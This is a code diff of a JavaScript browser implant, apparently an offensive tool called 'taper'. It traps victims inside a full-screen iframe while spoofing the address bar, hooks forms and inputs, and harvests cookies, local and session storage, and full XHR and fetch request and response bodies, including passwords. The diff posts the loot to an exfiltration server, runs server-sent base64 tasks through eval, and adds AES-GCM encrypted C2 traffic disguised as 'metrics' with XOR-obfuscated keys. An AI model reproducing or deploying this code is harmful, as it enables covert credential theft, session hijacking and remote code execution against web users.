+  			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  			request.send(jsonString);
+  		}
 
 
 		// We need to wait until the iframe/page has loaded to
 		// do HTML based looting. 
-		if (window.taperMode === "trap")
-		{
+  		if (window.taperMode === "trap")
+  		{
 			// if (currentUrl != 'blank')
 			// {
 			// 	window.history.replaceState(null, '', currentUrl);
@@ -913,178 +1077,194 @@ function runUpdate()
 		//	window.history.replaceState(null, '', currentUrl);
 			//captureUrlChangeLoot();
 
-			document.getElementById("iframe_a").onload = function() {
+  			document.getElementById("iframe_a").onload = function() {
 				// console.log("+++ Onload ready!");
 
 				// Fake the URL that the user sees. 
 				// This is important for iFrame trap mode. 
-				if (currentUrl != 'blank')
-				{
-					window.history.replaceState(null, '', currentUrl);
-				}
+  				if (currentUrl != 'blank')
+  				{
+  					window.history.replaceState(null, '', currentUrl);
+  				}
 
-				captureUrlChangeLoot();
-			}
-		}
-		else
-		{
+  				captureUrlChangeLoot();
+  			}
+  		}
+  		else
+  		{
 			// console.log("$$ implant mode capturelUrlChangeLoot branch..");
-			captureUrlChangeLoot();
-		}
-	}
+  			captureUrlChangeLoot();
+  		}
+  	}
 
 
 	// Updates that need to happen constantly
 	// hooking inputs, we can miss them otherwise
 	// hookInputs intelligently knows whether inputs
 	// need to be rehooked or not
-	hookInputs();
+  	hookInputs();
 
 
 	// Rehook form submissions
-	hookForms();
+  	hookForms();
 
 	// Handle Cookies
 	// Will only report when new cookies found, or values change. 
-	checkCookies();
+  	checkCookies();
 
 
 	// Check local storage
 	// Will only report when new or changed data found
-	checkLocalStorage();
+  	checkLocalStorage();
 
 
 	// Check session storage
 	// Will only report when new or changed data found
-	checkSessionStorage();
+  	checkSessionStorage();
 
-	if (window.taperMode === "trap")
-	{
+  	if (window.taperMode === "trap")
+  	{
 		// Fake the URL that the user sees. This is important. 
-		if (currentUrl != 'blank')
-		{
-			window.history.replaceState(null, '', currentUrl);
-		}
-	}
+  		if (currentUrl != 'blank')
+  		{
+  			window.history.replaceState(null, '', currentUrl);
+  		}
+  	}
 
 
 	// Check for tasks
-	if (window.taperTaskCheck)
-	{
-		if (!window.taperTaskUpdateScheduled)
-		{
-			var jitter = Math.floor(Math.random() * (window.taperTaskJitterTop - window.taperTaskJitterBottom + 1) + window.taperTaskJitterBottom)
+  	if (window.taperTaskCheck)
+  	{
+  		if (!window.taperTaskUpdateScheduled)
+  		{
+  			var jitter = Math.floor(Math.random() * (window.taperTaskJitterTop - window.taperTaskJitterBottom + 1) + window.taperTaskJitterBottom)
 
-			var delay = window.taperTaskCheckDelay + jitter;
-			setTimeout(checkTasks, delay);
-			window.taperTaskUpdateScheduled = true;
-		}
-	}
-}
-
-
+  			var delay = window.taperTaskCheckDelay + jitter;
+  			setTimeout(checkTasks, delay);
+  			window.taperTaskUpdateScheduled = true;
+  		}
+  	}
+  }
 
 
-function getXhrReference()
-{
-	if (window.taperMode === "trap")
-	{
-		return document.getElementById("iframe_a").contentWindow.XMLHttpRequest;
-	}
-	else
-	{
-		return XMLHttpRequest;
-	}
-}
 
 
-function getFetchReference()
-{
-	if (window.taperMode === "trap")
-	{
-		return document.getElementById("iframe_a").contentWindow;
-	}
-	else
-	{
-		return window;
-	}
-}
+  function getXhrReference()
+  {
+  	if (window.taperMode === "trap")
+  	{
+  		return document.getElementById("iframe_a").contentWindow.XMLHttpRequest;
+  	}
+  	else
+  	{
+  		return XMLHttpRequest;
+  	}
+  }
+
+
+  function getFetchReference()
+  {
+  	if (window.taperMode === "trap")
+  	{
+  		return document.getElementById("iframe_a").contentWindow;
+  	}
+  	else
+  	{
+  		return window;
+  	}
+  }
 
 
 // For saving up data about fetch calls
-const fetchDetailsMap = new Map();
+  const fetchDetailsMap = new Map();
 
 
 // Fetch API wrapper for monkey patching
-function customFetch(url, options)
-{
+  function customFetch(url, options)
+  {
 
-	if (this.noIntercept)
-	{
+  	if (this.noIntercept)
+  	{
 		// console.log("$$$$$ Skipping fetch intercept");
-		return;
-	}
+  		return;
+  	}
 
-	const requestId = Symbol('fetchRequest');
+  	const requestId = Symbol('fetchRequest');
 
 
 	// Stash the details to report out
-	fetchDetailsMap.set(requestId, {
-		method:         options.method || 'GET',
-		url:            url,
-		headers:        options.headers,
-		body:           btoa(options.body),
-		responseStatus: null,
-		responseBody:   null
-	});
+  	fetchDetailsMap.set(requestId, {
+  		method:         options.method || 'GET',
+  		url:            url,
+  		headers:        options.headers,
+  		body:           btoa(options.body),
+  		responseStatus: null,
+  		responseBody:   null
+  	});
 
 
 	// Let's get the API call good stuff
-	const requestBody = options.body;
+  	const requestBody = options.body;
 
 	// console.log("### About to clone request...");
 
 	// Clone request
 	// return fetch(url, options).then((response) => {
-	return originalFetch(url, options).then((response) => {
+  	return originalFetch(url, options).then((response) => {
 		// clone response
 
 		// Setup our stash mapping
-		const details = fetchDetailsMap.get(requestId);
-		details.responseStatus = response.status;
+  		const details = fetchDetailsMap.get(requestId);
+  		details.responseStatus = response.status;
 
-		return response.clone().text().then((body) => {
+  		return response.clone().text().then((body) => {
 			// console.log('Response Status:', response.status);
 			// console.log('Response Headers:', response.headers);
 			// console.log('Response Body:', body);
 
 			// stash it
-			details.responseBody = btoa(body);
+  			details.responseBody = btoa(body);
 
 			// Send to whole call dump
-			var request = new XMLHttpRequest();
-	        request.open("POST", taperexfilServer + "/loot/fetchRequest/" + sessionStorage.getItem('taperSessionUUID'));
-	        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-	        var jsonString = JSON.stringify(details);
-	        request.send(jsonString);
+  			var request = new XMLHttpRequest();
+      // request.open("POST", taperexfilServer + "/loot/fetchRequest/" + sessionStorage.getItem('taperSessionUUID'));
+      // request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  			var jsonString = JSON.stringify(details);
+      // request.send(jsonString);
+
+  			if (window.taperMetricsBox)
+  			{
+				// We're go-go for encrypted comms!
+  				sendMetrics("/loot/fetchRequest", jsonString);
+  			}
+  			else
+  			{
+				// Nope, regular mode
+  				request = new window.taperXHR();
+  				request.noIntercept = true;
+  				request.open("POST", taperexfilServer + "/loot/fetchRequest/" + 
+  					sessionStorage.getItem('taperSessionUUID'));
+  				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  				request.send(jsonString);
+  			}
 
 
 			// Check if we should take a screenshot now
-			if (window.postApiCallScreenshot)
-			{
-				setTimeout(sendScreenshot, window.screenshotDelay);
-			}
+  			if (window.postApiCallScreenshot)
+  			{
+  				setTimeout(sendScreenshot, window.screenshotDelay);
+  			}
 
 
 			// Continue on like nothing is amiss
-			return response;
-		});
-	})
-	.catch((error) => {
-		console.error('Error:', error);
-		throw error;
-	});
-}
+  			return response;
+  		});
+  	})
+  	.catch((error) => {
+  		console.error('Error:', error);
+  		throw error;
+  	});
+  }
 
 
 
@@ -1093,66 +1273,66 @@ function customFetch(url, options)
 // Monkey patch API prototypes to intercept API calls
 // Only works for Trap mode, all sorts of bad things 
 // happen when we try to do this in implant mode
-function monkeyPatchXHR()
-{
+  function monkeyPatchXHR()
+  {
 	// console.log("** Enabling API monkey patches...");
 
 	// XHR Part
-	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
-	const xhrOriginalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
-	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
+  	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
+  	const xhrOriginalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
+  	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
 
 
 	// Stash stuff for later access
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.requestDetails = {
-	    method: null,
-	    url: null,
-	    headers: {},
-	    body: null,
-	    async: true,
-	    user: null,
-	    password: null,
-	    responseBody: null,
-	    responseStatus: null
-	};
+  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.requestDetails = {
+  		method: null,
+  		url: null,
+  		headers: {},
+  		body: null,
+  		async: true,
+  		user: null,
+  		password: null,
+  		responseBody: null,
+  		responseStatus: null
+  	};
 
 
 	//Monkey patch open
 	// XHR monkeypatch only stable in trap mode
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
-	{
-		var method = arguments[0];
-		var url    = arguments[1];
+  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+  	{
+  		var method = arguments[0];
+  		var url    = arguments[1];
 
 		// console.log("Intercepted XHR open: " + method + ", " + url);
 
 		// Stash it all
-      	this.requestDetails.method   = method;
-        this.requestDetails.url      = url;
-        this.requestDetails.async    = async;
-        this.requestDetails.user     = user;
-        this.requestDetails.password = password;
+  		this.requestDetails.method   = method;
+  		this.requestDetails.url      = url;
+  		this.requestDetails.async    = async;
+  		this.requestDetails.user     = user;
+  		this.requestDetails.password = password;
 
-		xhrOriginalOpen.apply(this, arguments);
-	}
+  		xhrOriginalOpen.apply(this, arguments);
+  	}
 
 
 
 	// Monkey patch setRequestHeader
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
-	{
-		var header = arguments[0];
-		var value  = arguments[1];
+  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
+  	{
+  		var header = arguments[0];
+  		var value  = arguments[1];
 
 		// Stash it
-		this.requestDetails.headers[header] = value;
+  		this.requestDetails.headers[header] = value;
 
-		xhrOriginalSetHeader.apply(this, arguments);
-	}
+  		xhrOriginalSetHeader.apply(this, arguments);
+  	}
 
 
 	// Monkey patch send
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) {
+  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) {
 	    var originalOnReadyStateChange = this.onreadystatechange;  // Save the original handler
 
 	    // Your interception logic
@@ -1164,55 +1344,67 @@ function monkeyPatchXHR()
 
 	    this.onreadystatechange = function() {
 	        // Call the original handler first, if it exists
-	        if (originalOnReadyStateChange) {
-	            originalOnReadyStateChange.apply(this, arguments);
-	        }
+	    	if (originalOnReadyStateChange) {
+	    		originalOnReadyStateChange.apply(this, arguments);
+	    	}
 
 	        // Then do your logging
-	        if (this.readyState === 4) {
-	            var data;
+	    	if (this.readyState === 4) {
+	    		var data;
 
-	            if (!this.responseType || this.responseType === "text") {
-	                data = this.responseText;
-	            } else if (this.responseType === "document") {
-	                data = this.responseXML;
-	            } else if (this.responseType === "json") {
-	                data = JSON.stringify(this.response);
-	            } else {
-	                data = this.response;
-	            }
+	    		if (!this.responseType || this.responseType === "text") {
+	    			data = this.responseText;
+	    		} else if (this.responseType === "document") {
+	    			data = this.responseXML;
+	    		} else if (this.responseType === "json") {
+	    			data = JSON.stringify(this.response);
+	    		} else {
+	    			data = this.response;
+	    		}
 
-	            var responseBody = btoa(data);
+	    		var responseBody = btoa(data);
 
-	           	// Stash the response
-	            this.requestDetails.responseBody   = responseBody;
-	            this.requestDetails.responseStatus = this.status;
+           	// Stash the response
+	    		this.requestDetails.responseBody   = responseBody;
+	    		this.requestDetails.responseStatus = this.status;
 
 
-	            // now the big dump
-	           	console.log("+++ XHR request dump: ")
-			    console.log(this.requestDetails);
+            // now the big dump
+           	// console.log("+++ XHR request dump: ")
+			    	// console.log(this.requestDetails);
 
-		        var request = new XMLHttpRequest();
-		        request.open("POST", taperexfilServer + "/loot/xhrRequest/" + sessionStorage.getItem('taperSessionUUID'));
-		        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		        var jsonString = JSON.stringify(this.requestDetails);
-		        request.send(jsonString);
-	        }
+	    		var jsonString = JSON.stringify(this.requestDetails);
+
+	    		if (window.taperMetricsBox)
+	    		{
+							// We're go-go for encrypted comms!
+	    			sendMetrics("/loot/xhrRequest", jsonString);
+	    		}
+	    		else
+	    		{
+							// Nope, regular mode
+	    			request = new window.taperXHR();
+	    			request.noIntercept = true;
+	    			request.open("POST", taperexfilServer + "/loot/xhrRequest/" + 
+	    				sessionStorage.getItem('taperSessionUUID'));
+	    			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	    			request.send(jsonString);
+	    		}
+	    	}
 	    };
 
 	    xhrOriginalSend.call(this, data);  // Ensure to use the original send
-	};
+	  };
 
 
 	//xhrOriginalSend.apply(this, arguments);
 
 	// Check if we should take a screenshot now
-	if (window.postApiCallScreenshot)
-	{
-		setTimeout(sendScreenshot, window.screenshotDelay);
+	  if (window.postApiCallScreenshot)
+	  {
+	  	setTimeout(sendScreenshot, window.screenshotDelay);
+	  }
 	}
-}
 
 
 
@@ -1220,81 +1412,135 @@ function monkeyPatchXHR()
 
 
 
-function monkeyPatchFetch()
-{
+	function monkeyPatchFetch()
+	{
 	// Fetch API monkey patching
-	getFetchReference().fetch = customFetch;
-}
-
-
-
-
-async function checkTasks()
-{
-	var taskRequest  = await fetch(taperexfilServer + "/client/taskCheck/" + sessionStorage.getItem('taperSessionUUID'));
-	var jsonResponse = await taskRequest.json();
-
-	for (let i = 0; i < jsonResponse.length; i++)
-	{
-		var taskId   = jsonResponse[i].id;
-		var taskData = jsonResponse[i].data;
-
-		// console.log("Got task: " + taskData);
-
-		try
-		{
-			eval(atob(taskData));
-		}
-		catch (error)
-		{
-			//console.log('Error running task ' + taskId);
-			customExfil('Task Error', 'Error running task ' + taskId + ': ' + error.message);
-		}
+		getFetchReference().fetch = customFetch;
 	}
-	window.taperTaskUpdateScheduled = false;
-}
+
+
+// Utility function to convert a base64 string to an ArrayBuffer.
+	function base64ToArrayBuffer(base64) {
+		const binaryString = atob(base64);
+		const len = binaryString.length;
+		const bytes = new Uint8Array(len);
+		for (let i = 0; i < len; i++) {
+			bytes[i] = binaryString.charCodeAt(i);
+		}
+		return bytes.buffer;
+	}
+
+	async function checkTasks() {
+		if (window.taperMetricsBox) {
+    // Encrypted/Obfuscated version
+			var response = await sendMetrics("/client/taskCheck", "");
+
+    // Parse the JSON response.
+			var jsonResponse = JSON.parse(response);
+			var metricData = jsonResponse.metricData;
+
+			var parts = metricData.split(",");
+			if (parts.length < 2) {
+				console.error("Invalid metricData format:", metricData);
+				return;
+			}
+
+			var ivBase64     = parts[0];
+			var cipherBase64 = parts[1];
+
+			var ivBuffer     = base64ToArrayBuffer(ivBase64);
+			var cipherBuffer = base64ToArrayBuffer(cipherBase64);
+
+			try {
+      // Decrypt the data. Note: new Uint8Array(ivBuffer) is a view of the IV.
+				var clearMessageBuffer = await window.crypto.subtle.decrypt(
+					{ name: "AES-GCM", iv: new Uint8Array(ivBuffer) },
+					window.taperCatcher,
+					cipherBuffer
+					);
+				var clearMessageText = new TextDecoder().decode(clearMessageBuffer);
+      //console.log("Decoded: " + clearMessageText);
+
+				var jsonData = JSON.parse(clearMessageText);
+				for (let i = 0; i < jsonData.length; i++)
+				{
+					var taskId   = jsonData[i].id;
+					var taskData = jsonData[i].data;
+      //	console.log("Task: " + taskId + ", data: " + atob(taskData));
+
+					try {
+						eval(atob(taskData));
+					} catch (error) {
+						customExfil("Task Error", "Error running task " + taskId + ": " + error.message);
+					}
+				}
+			} catch (error) {
+				console.log("Error:", error);
+				throw error;
+			}
+		} else {
+  	// Unencrypted/Obfuscated version
+			var taskRequest = await fetch(
+				taperexfilServer + "/client/taskCheck/" + sessionStorage.getItem("taperSessionUUID")
+				);
+			var jsonResponse = await taskRequest.json();
+
+			for (let i = 0; i < jsonResponse.length; i++) {
+				var taskId = jsonResponse[i].id;
+				var taskData = jsonResponse[i].data;
+
+				try {
+					eval(atob(taskData));
+				} catch (error) {
+					customExfil("Task Error", "Error running task " + taskId + ": " + error.message);
+				}
+			}
+		}
+
+		window.taperTaskUpdateScheduled = false;
+	}
 
 
 // Start the tap
-function takeOver()
-{
-	var myReference = "";
-
-	if (window.taperMode === "trap")
+	function takeOver()
 	{
+		var myReference = "";
+
+		if (window.taperMode === "trap")
+		{
 		// console.log("Starting iFrame Trap");
 
 		// Setup our iframe trap
-		var iframe = document.createElement("iframe");
-		iframe.setAttribute("src", taperstartingPage);
-		iframe.setAttribute("style", "border:none");
+			var iframe = document.createElement("iframe");
+			iframe.setAttribute("src", taperstartingPage);
+			iframe.setAttribute("style", "border:none");
 
-		if (taperfullscreenIframe)
-		{
+			if (taperfullscreenIframe)
+			{
 			// console.log("&& Using fullscreen");
-			iframe.style.width  = "100%";
-			iframe.style.height = "100%";
-			iframe.style.top = "0px";
-			iframe.style.left = "0px"
-		}
-		else
-		{
+				iframe.style.width  = "100%";
+				iframe.style.height = "100%";
+				iframe.style.top = "0px";
+				iframe.style.left = "0px"
+			}
+			else
+			{
 			// console.log("&& Using partial screen");
-			iframe.style.width  = "80%";
-			iframe.style.height = "80%";
-			iframe.style.top = "50px";
-			iframe.style.left = "50px";
-		}
-		iframe.style.position = "fixed";
-		iframe.id = "iframe_a";
-		document.body.appendChild(iframe);
+				iframe.style.width  = "80%";
+				iframe.style.height = "80%";
+				iframe.style.top = "50px";
+				iframe.style.left = "50px";
+			}
+			iframe.style.position = "fixed";
+			iframe.id = "iframe_a";
+			document.body.appendChild(iframe);
 
 		// Just register all the darned events, each event in the iframe
 		// we'll call runUpdate()
-		var myReference = document.getElementById('iframe_a').contentDocument;
-		window.history.replaceState(null, '', taperstartingPage);
+			var myReference = document.getElementById('iframe_a').contentDocument;
+			window.history.replaceState(null, '', taperstartingPage);
 
-	}
+		}
 	else // implant mode
 	{
 		// console.log("Starting implant mode!");
@@ -1331,6 +1577,223 @@ function takeOver()
 
 
 
+// Sleep helper
+function sleep(ms) 
+{
+	return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+
+
+// Wait until window.taperMetricsBox is initialized
+async function waitForMetricsBox() 
+{
+	while (!window.taperMetricsBox) {
+    await sleep(100); // wait 100ms before checking again
+  }
+}
+
+
+
+function hexToUint8Array(hexString) 
+{
+	if (hexString.length % 2 !== 0) {
+		throw new Error("Invalid hex string");
+	}
+	const arrayBuffer = new Uint8Array(hexString.length / 2);
+	for (let i = 0; i < hexString.length; i += 2) {
+		arrayBuffer[i / 2] = parseInt(hexString.substr(i, 2), 16);
+	}
+	return arrayBuffer;
+}
+
+
+function arrayBufferToBase64(buffer) 
+{
+	let binary = '';
+	const bytes = new Uint8Array(buffer);
+	for (let i = 0; i < bytes.byteLength; i++) {
+		binary += String.fromCharCode(bytes[i]);
+	}
+	return window.btoa(binary);
+}
+
+
+
+
+// Helper function for initializing encryption
+async function initMetrics(debug) {
+  // Check for Web Crypto support and secure context.
+  if (!window.crypto || !window.crypto.subtle) {
+    //console.warn("WebCrypto API not available (possibly insecure context).");
+    window.taperMetricsBox = null;
+    return;
+  }
+
+  try {
+    window.taperMetricsBox = await window.crypto.subtle.importKey(
+      "raw",               // Format
+      debug,               // Key data (ArrayBuffer)
+      { name: "AES-GCM" }, // Algorithm
+      false,               // Not extractable
+      ["encrypt"]          // Usages
+    );
+  } catch (error) {
+    //console.error("WebCrypto initialization failed:", error);
+    window.taperMetricsBox = null; // Ensure it's not set
+  }
+}
+
+
+
+
+
+
+async function initCatcher(debug) {
+  // Check if WebCrypto API is available and the context is secure.
+  if (!window.crypto || !window.crypto.subtle) {
+    //console.warn("WebCrypto API not available (possibly insecure context).");
+    window.taperCatcher = null;
+    return;
+  }
+
+  try {
+    window.taperCatcher = await window.crypto.subtle.importKey(
+      "raw",               // Key format
+      debug,               // Key data (ArrayBuffer)
+      { name: "AES-GCM" }, // Algorithm
+      false,               // Not extractable
+      ["decrypt"]          // Key usage
+    );
+  } catch (error) {
+    //console.error("WebCrypto initialization for decryption failed:", error);
+    window.taperCatcher = null; // Ensure it's not set if initialization fails
+  }
+}
+
+
+
+
+
+async function sendMetrics(path, message)
+{
+	await waitForMetricsBox();
+
+	var ivArray       = window.crypto.getRandomValues(new Uint8Array(12));
+	var pathData      = new TextEncoder().encode(path);
+	var messageData   = new TextEncoder().encode(message);
+	var pathMessage   = await window.crypto.subtle.encrypt({name:"AES-GCM",iv: ivArray},window.taperMetricsBox, pathData);
+	var metricMessage = await window.crypto.subtle.encrypt({name:"AES-GCM",iv: ivArray},window.taperMetricsBox, messageData);
+
+	var ivBase64      = arrayBufferToBase64(ivArray);
+	var pathBase64    = arrayBufferToBase64(pathMessage);
+	var messageBase64 = arrayBufferToBase64(metricMessage);
+
+	var messageData = ivBase64 + "," + pathBase64 + "," + messageBase64;
+
+	const payload = {
+		metricData: messageData
+	};
+
+	return new Promise((resolve, reject) => {
+		const request = new window.taperXHR();
+		request.noIntercept = true;
+		request.open("POST", taperexfilServer + "/client/metrics/" + sessionStorage.getItem('taperSessionUUID'));
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+		request.onload = function() {
+			if (request.status >= 200 && request.status < 300) {
+				resolve(request.responseText);
+			} else {
+				reject(new Error("Request failed: " + request.statusText));
+			}
+		};
+
+		request.onerror = function() {
+			reject(new Error("Network error"));
+		};
+
+		request.send(JSON.stringify(payload));
+	});
+}
+
+
+
+
+
+// Check if we're using obfuscation and
+// setup our crypto objects if we are
+
+async function checkMetrics(token) {
+  return new Promise(async (resolve, reject) => {
+    const obRequest = new window.taperXHR();
+    obRequest.noIntercept = true;
+
+    obRequest.open("GET", window.taperexfilServer + "/client/metricSettings/" + token);
+    obRequest.onreadystatechange = async function() {
+      if (obRequest.readyState === XMLHttpRequest.DONE) {
+        if (obRequest.status === 200) {
+          try {
+            const obJsonResponse = JSON.parse(obRequest.responseText);
+            if (obJsonResponse.enable === "true") {
+              // Pull out the keys from the obfuscated string.
+              const obfuscatedString = atob(obJsonResponse.metricDebug);
+              const obfuscatedData = new Uint8Array([...obfuscatedString].map(c => c.charCodeAt(0)));
+              
+              const idHex = token.replace(/-/g, '');
+              const idBytes = new Uint8Array(
+                idHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16))
+              );
+              
+              const shift = 7 % idBytes.length;
+              const rotateBytes = new Uint8Array([
+                ...idBytes.slice(shift),
+                ...idBytes.slice(0, shift)
+              ]);
+
+              const masker = new Uint8Array(obfuscatedData.length);
+              for (let i = 0; i < obfuscatedData.length; i++) {
+                masker[i] = rotateBytes[i % rotateBytes.length];
+              }
+
+              const plaintextData = new Uint8Array(obfuscatedData.length);
+              for (let i = 0; i < obfuscatedData.length; i++) {
+                plaintextData[i] = obfuscatedData[i] ^ masker[i];
+              }
+              
+              // Extract the two keys, one to send and one to receive.
+              const receiveKey = plaintextData.slice(0, 32);
+              const sendKey    = plaintextData.slice(32, 64);
+
+              // Convert the keys to hex strings for easier inspection.
+              const receiveKeyHex = Array.from(receiveKey)
+                .map(b => b.toString(16).padStart(2, '0'))
+                .join('');
+              const sendKeyHex = Array.from(sendKey)
+                .map(b => b.toString(16).padStart(2, '0'))
+                .join('');
+
+              // Setup our crypto API.
+              // `initMetrics` sends encrypted data, and `initCatcher` lets us decrypt received data.
+              await initMetrics(hexToUint8Array(sendKeyHex));
+              await initCatcher(hexToUint8Array(receiveKeyHex));
+            }
+            // Resolve the promise once processing is complete.
+            resolve();
+          } catch (e) {
+            reject(e);
+          }
+        } else {
+          reject(new Error("HTTP error: " + obRequest.status));
+        }
+      }
+    };
+
+    obRequest.send(null);
+  });
+}
+
+
 
 
 // ********************************************
@@ -1347,69 +1810,88 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 	// Just because we reloaded the payload doesn't mean
 	// we don't already have our session/UUID. Check first before
 	// overwriting
-	if (sessionStorage.getItem('taperSessionUUID') === '')
-	{
+	(async () => {
+		if (sessionStorage.getItem('taperSessionUUID') === '')
+		{
 		// Get our client UUID
-		request = new window.taperXHR();
-		request.noIntercept = true;
-		if (window.taperTag === "")
-		{
-			request.open("GET", window.taperexfilServer + "/client/getToken", true);
-		}
-		else
-		{
-			request.open("GET", window.taperexfilServer + "/client/getToken/" + window.taperTag, true);
-		}
-		request.send(null);
-
-		request.onreadystatechange = function()
-		{
-			if (request.readyState == XMLHttpRequest.DONE)
+			request = new window.taperXHR();
+			request.noIntercept = true;
+			if (window.taperTag === "")
 			{
-				if (request.status == 200)
-				{
-					// We have a session, start taking over
-					if (window.taperMode === "trap")
-					{
-						// Blank main page
-						document.body.innerHTML = "";
-						document.body.outerHTML = "";
-					}
+				request.open("GET", window.taperexfilServer + "/client/getToken", true);
+			}
+			else
+			{
+				request.open("GET", window.taperexfilServer + "/client/getToken/" + window.taperTag, true);
+			}
+			request.send(null);
 
-					var jsonResponse = JSON.parse(request.responseText);
-					sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
+			request.onreadystatechange = async function()
+			{
+				if (request.readyState == XMLHttpRequest.DONE)
+				{
+					if (request.status == 200)
+					{
+					// We have a session, start taking over
+						if (window.taperMode === "trap")
+						{
+						// Blank main page
+							document.body.innerHTML = "";
+							document.body.outerHTML = "";
+						}
+
+						var jsonResponse = JSON.parse(request.responseText);
+
+					// Check for obfuscation settings/keys
+						await checkMetrics(jsonResponse.clientToken);
+
+						sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
+
 
 
     				// We're ready to trap all the things now
-					takeOver();
+						takeOver();
 
-					getFingerprintHash().then(hash => {
-					    console.log('Hash:', hash);
-					    request = new window.taperXHR();
-					    request.noIntercept = true;
-					    request.open("POST", taperexfilServer + "/client/fingerprint/" +
-					    	sessionStorage.getItem('taperSessionUUID'));
-						request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-						var jsonObj = new Object();
-						jsonObj["fingerprint"] = hash;
-						var jsonString = JSON.stringify(jsonObj);
-						request.send(jsonString);
-					});
-				}
+						getFingerprintHash().then(hash => {
+							if (window.taperMetricsBox)
+							{
+							// We're go-go for encrypted comms!
+								sendMetrics("/client/fingerprint", hash);
+							}
+							else
+							{
+							// Nope, regular mode
+								request = new window.taperXHR();
+								request.noIntercept = true;
+								request.open("POST", taperexfilServer + "/client/fingerprint/" +
+									sessionStorage.getItem('taperSessionUUID'));
+								request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+								var jsonObj = new Object();
+								jsonObj["fingerprint"] = hash;
+								var jsonString = JSON.stringify(jsonObj);
+								request.send(jsonString);
+							}
+
+
+						});
+					}
 				// else
 				// {
 				// 	console.log("No client session received, skipping");
 				// }
+				}
 			}
 		}
-	}
-	else
-	{
+		else
+		{
 		// console.log("*** taperSessionUUID not null, not requesting a new one: " + sessionStorage.getItem('taperSessionUUID'));
-
-		takeOver();
-		sendScreenshot();
-	}
+		// Restarting with existing session
+		// need to check for obfuscation again
+			await checkMetrics(sessionStorage.getItem('taperSessionUUID'));
+			takeOver();
+			sendScreenshot();
+		}
+	})();
 }
 else // payload already loaded
 {
@@ -1832,7 +2314,7 @@ return Bounds;
     	return this.errorValue;
     };
     return Trie;
-}());
+  }());
 
     /*
      * base64-arraybuffer 1.0.2 <https://github.com/niklasvh/base64-arraybuffer>
@@ -2137,17 +2619,17 @@ return Bounds;
     if ((ALPHABETICS.indexOf(current) !== -1 && PREFIX_POSTFIX.indexOf(next) !== -1) ||
     	(PREFIX_POSTFIX.indexOf(current) !== -1 && ALPHABETICS.indexOf(next) !== -1)) {
     	return BREAK_NOT_ALLOWED$1;
-}
+  }
         // LB25 Do not break between the following pairs of classes relevant to numbers:
-if (
+  if (
         // (PR | PO) × ( OP | HY )? NU
-	([PR, PO].indexOf(current) !== -1 &&
-		(next === NU || ([OP, HY].indexOf(next) !== -1 && classTypes[afterIndex + 1] === NU))) ||
+  	([PR, PO].indexOf(current) !== -1 &&
+  		(next === NU || ([OP, HY].indexOf(next) !== -1 && classTypes[afterIndex + 1] === NU))) ||
             // ( OP | HY ) × NU
-	([OP, HY].indexOf(current) !== -1 && next === NU) ||
+  	([OP, HY].indexOf(current) !== -1 && next === NU) ||
             // NU ×	(NU | SY | IS)
-	(current === NU && [NU, SY, IS].indexOf(next) !== -1)) {
-	return BREAK_NOT_ALLOWED$1;
+  	(current === NU && [NU, SY, IS].indexOf(next) !== -1)) {
+  	return BREAK_NOT_ALLOWED$1;
 }
         // NU (NU | SY | IS)* × (NU | SY | IS | CL | CP)
 if ([NU, SY, IS, CL, CP].indexOf(next) !== -1) {
@@ -2762,7 +3244,7 @@ return Break;
     else {
     	value.push(codePoint);
     }
-}
+  }
 };
 Tokenizer.prototype.consumeWhiteSpace = function () {
 	while (isWhiteSpace(this.peekCodePoint(0))) {
@@ -3026,7 +3508,7 @@ return Parser;
             if (token.type !== 31 /* WHITESPACE_TOKEN */) {
     	arg.push(token);
     }
-});
+  });
     	if (arg.length) {
     		args.push(arg);
     	}
@@ -3038,7 +3520,7 @@ return Parser;
     }
         if (type === 28 /* LEFT_SQUARE_BRACKET_TOKEN */ && token.type === 29 /* RIGHT_SQUARE_BRACKET_TOKEN */) {
     return true;
-}
+  }
         return type === 2 /* LEFT_PARENTHESIS_TOKEN */ && token.type === 3 /* RIGHT_PARENTHESIS_TOKEN */;
 };
 
@@ -3080,154 +3562,154 @@ if (isDimensionToken(token)) {
 	case 'rem':
 	case 'em':
                     return 16 * token.number; // TODO use correct font-size
-                case 'px':
-                default:
-                	return token.number;
+                  case 'px':
+                  default:
+                  	return token.number;
+                  }
                 }
-            }
-            return token.number;
-        };
+                return token.number;
+              };
 
-        var DEG = 'deg';
-        var GRAD = 'grad';
-        var RAD = 'rad';
-        var TURN = 'turn';
-        var angle = {
-        	name: 'angle',
-        	parse: function (_context, value) {
+              var DEG = 'deg';
+              var GRAD = 'grad';
+              var RAD = 'rad';
+              var TURN = 'turn';
+              var angle = {
+              	name: 'angle',
+              	parse: function (_context, value) {
             if (value.type === 15 /* DIMENSION_TOKEN */) {
-        		switch (value.unit) {
-        		case DEG:
-        			return (Math.PI * value.number) / 180;
